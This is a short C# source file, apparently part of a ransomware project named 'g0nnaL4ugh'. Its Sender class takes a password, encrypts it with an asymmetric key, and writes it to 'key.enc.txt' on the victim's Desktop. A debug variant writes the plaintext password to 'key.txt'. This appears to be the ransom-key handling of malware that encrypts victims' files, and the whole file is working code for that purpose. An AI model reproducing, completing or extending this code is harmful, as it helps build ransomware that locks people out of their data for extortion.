using System;
using System.IO;
using g0nnaL4ugh.Crypto;

namespace g0nnaL4ugh.Snitch
{
    public class Sender
    {      
        public static void SnitchPwd(string pwd, PathUtil pathUtil,
		                             Encrypter encrypter)
        {
            Console.WriteLine("Pwd snitch: " + pwd);
			byte[] pwdBytes = Utilities.ConvertUTF2Bytes(pwd);
            byte[] asymEncrypted = encrypter.AsymEncryptBytes(pwdBytes);
            Writter.WriteBytes2File(asymEncrypted,
                                    Path.Combine(pathUtil.Desktop,
			                                     "key.enc.txt"));
        }

#if DEBUG      
		public static void FakeSnitchPwd(string pwd, PathUtil pathUtil,
		                                 Encrypter encrypter)
        {
            Console.WriteLine("Fake pwd snitch: " + pwd);
            byte[] pwdBytes = Utilities.ConvertUTF2Bytes(pwd);
            // byte[] asymEncrypted = encrypter.AsymEncryptBytes(pwdBytes);
            /* Writter.WriteBytes2File(asymEncrypted,
			                        Path.Combine(pathUtil.Desktop, "key.enc.txt"));*/
			Writter.WriteBytes2File(pwdBytes,
                                    Path.Combine(pathUtil.Desktop,
			                                     "key.txt"));
        }
#endif
    }
}